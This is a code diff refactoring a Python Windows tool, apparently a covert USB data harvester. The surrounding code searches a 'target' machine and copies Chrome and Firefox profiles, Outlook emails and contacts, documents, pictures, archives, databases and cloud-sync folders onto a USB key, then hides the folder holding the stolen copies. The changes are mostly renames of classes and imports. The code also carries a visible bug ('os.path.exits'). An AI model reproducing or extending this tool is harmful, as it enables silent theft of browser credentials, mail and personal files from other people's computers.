@@ -28,8 +28,8 @@ import glob
 import shutil
 import sys
 
-from splendenteDirs import TargetDirectories
-from splendenteConf import ExtConf, DirsConf
+from splendenteDirs import Directories
+from splendenteConf import Conf
 from splendenteUtils import Date, SmallSize, MediumSize, HighSize, BigSize
 from splendenteMount import TargetMount, UsbMount
 from splendenteCopy import Copy
@@ -75,16 +75,20 @@ def main():
                     if os.path.exits(dataUsbDirectory) == True:
 
                         # --- Found directories on target --- #
-                        targetDirectoriesFound = TargetDirectories.DirectoryFound(DirsConf.Directories(confUsbDirectory),"Target",TargetMount.SearchPartitionsMount(), UsbMount.SearchPartitionsMount())
-                        for i in targetDirectoriesFound:
+                        directoriesFound = Directories.Search(Conf.Directories(confUsbDirectory),"Target",TargetMount.SearchPartitionsMount(), UsbMount.SearchPartitionsMount())
+                        for i in directoriesFound:
                             if i != None:
                                 logging.info("Found : {0}".format(i))
+                            else:
+                                continue
 
                         # --- Create folders in USB that will found on target --- #
-                        usbDirectories = TargetDirectories.DirectoryFound(DirsConf.Directories(confUsbDirectory),"USB", TargetMount.SearchPartitionsMount(), UsbMount.SearchPartitionsMount())
+                        usbDirectories = Directories.Search(Conf.Directories(confUsbDirectory),"USB", TargetMount.SearchPartitionsMount(), UsbMount.SearchPartitionsMount())
                         for i in usbDirectories:
                             if i != None:
                                 os.makedirs("{0}\\{1}".format(dataUsbDirectory, i))
+                            else:
+                                continue
 
                         # --- Check if agent directory is available on USB key --- #
                         if os.path.exists("{0}\\agent".format(SEARCH_USB_MOUNT_LETTER)) == True:
@@ -108,36 +112,36 @@ def main():
 
                         # -- Files copy from target -- #
                         for usbFolder in usbDirectories:
-                            for targetPath in targetDirectoriesFound:
+                            for targetPath in directoriesFound:
 
                                 # -- Folders of user profile and other partitions mounted -- #
                                 if usbFolder in targetPath:
                                     usbFolderFound = dataUsbDirectory + "\\" + usbFolder
 
                                     if re.match(r"(^Chrome$)", usbFolder):
-                                        Copy.MediumDepth(ExtConf.ChromeBrowser(confUsbDirectory), usbFolderFound, targetPath, BigSize())
+                                        Copy.MediumDepth(Conf.ChromeBrowser(confUsbDirectory), usbFolderFound, targetPath, BigSize())
 
                                     elif re.match(r"(^Firefox$)", usbFolder):
-                                        Copy.MediumDepth(ExtConf.FirefoxBrowser(confUsbDirectory), usbFolderFound, targetPath, BigSize())
+                                        Copy.MediumDepth(Conf.FirefoxBrowser(confUsbDirectory), usbFolderFound, targetPath, BigSize())
 
                                     elif re.match(r"(^Outlook$)|(^Contacts$)", usbFolder):
-                                        Copy.MediumDepth(ExtConf.Emails(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
+                                        Copy.MediumDepth(Conf.Emails(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
 
                                     elif re.match(r"(^Pictures$)", usbFolder):
-                                        Copy.HighDepth(ExtConf.Pictures(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
+                                        Copy.HighDepth(Conf.Pictures(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
 
                                     elif re.match(r"(^Documents$)|(^Downloads$)|(^Desktop$)|(^Dropbox$)|(^OneDrive$)", usbFolder):
-                                        Copy.HighDepth(ExtConf.Docs(confUsbDirectory), usbFolderFound, targetPath, HighSize())
-                                        Copy.HighDepth(ExtConf.Pictures(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
-                                        Copy.HighDepth(ExtConf.Compress(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
-                                        Copy.HighDepth(ExtConf.Databases(confUsbDirectory), usbFolderFound, targetPath, BigSize())
+                                        Copy.HighDepth(Conf.Docs(confUsbDirectory), usbFolderFound, targetPath, HighSize())
+                                        Copy.HighDepth(Conf.Pictures(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
+                                        Copy.HighDepth(Conf.Compress(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
+                                        Copy.HighDepth(Conf.Databases(confUsbDirectory), usbFolderFound, targetPath, BigSize())
 
                                     elif re.match(r"^\D?$", usbFolder) and os.environ["USERPROFILE"] not in targetPath:
-                                        Copy.HighDepth(ExtConf.Docs(confUsbDirectory), usbFolderFound, targetPath, HighSize())
-                                        Copy.HighDepth(ExtConf.Pictures(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
-                                        Copy.HighDepth(ExtConf.Compress(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
-                                        Copy.HighDepth(ExtConf.Databases(confUsbDirectory), usbFolderFound, targetPath, BigSize())
-                                        Copy.HighDepth(ExtConf.Pictures(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
+                                        Copy.HighDepth(Conf.Docs(confUsbDirectory), usbFolderFound, targetPath, HighSize())
+                                        Copy.HighDepth(Conf.Pictures(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
+                                        Copy.HighDepth(Conf.Compress(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
+                                        Copy.HighDepth(Conf.Databases(confUsbDirectory), usbFolderFound, targetPath, BigSize())
+                                        Copy.HighDepth(Conf.Pictures(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
 
                                     else:
                                         continue
@@ -157,10 +161,10 @@ def main():
                                 elif re.match(r"(^WindowsHome$)", usbFolder) and targetPath == os.environ["USERPROFILE"]:
                                     usbFolderFound = dataUsbDirectory + "\\" + usbFolder
 
-                                    Copy.SmallDepth(ExtConf.Databases(confUsbDirectory), usbFolderFound, targetPath, BigSize())
-                                    Copy.SmallDepth(ExtConf.Programs(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
-                                    Copy.SmallDepth(ExtConf.Docs(confUsbDirectory), usbFolderFound, targetPath, HighSize())
-                                    Copy.SmallDepth(ExtConf.Compress(confUsbDirectory), usbFolderFound, targetPath, HighSize())
+                                    Copy.SmallDepth(Conf.Databases(confUsbDirectory), usbFolderFound, targetPath, BigSize())
+                                    Copy.SmallDepth(Conf.Programs(confUsbDirectory), usbFolderFound, targetPath, MediumSize())
+                                    Copy.SmallDepth(Conf.Docs(confUsbDirectory), usbFolderFound, targetPath, HighSize())
+                                    Copy.SmallDepth(Conf.Compress(confUsbDirectory), usbFolderFound, targetPath, HighSize())
 
                                     if glob.glob("{0}\\*.*".format(usbFolderFound)) != []:
                                         logging.info("Copy : {0} -> successful".format(usbFolderFound))
@@ -177,6 +181,7 @@ def main():
 
                         # -- Set the folder in hidden mode containing the copied files -- #
                         win32api.SetFileAttributes(dataUsbDirectory, win32con.FILE_ATTRIBUTE_HIDDEN)
+                        
                     else:
                         logging.error("No {0}\\data directory".format(SEARCH_USB_MOUNT_LETTER))
                 else:
